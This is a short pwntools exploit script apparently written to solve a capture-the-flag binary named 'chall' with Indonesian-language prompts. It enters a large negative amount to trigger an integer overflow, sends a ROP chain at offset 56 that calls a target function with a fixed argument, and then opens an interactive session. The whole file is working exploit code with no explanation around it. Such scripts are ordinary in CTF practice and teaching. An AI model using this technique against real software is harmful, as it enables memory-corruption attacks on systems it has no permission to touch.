from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''

'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

offset = 56

io.sendlineafter(b'>', b'4')
io.sendlineafter(b'Masukin Jumlahnya: ', b'-18446744073709551')
io.sendlineafter(b'>', b'1')
ret = ROP(elf).find_gadget(['ret'])[0]
rop = ROP(elf)
pop_rdi = ROP(elf).find_gadget(['pop rdi'])[0]
rop.printf_something_wrong(0x19b6da8f2bdcb1ee)
payload = flat({offset : rop.chain()})
io.sendline(payload)
io.sendline(b'5')
io.interactive()

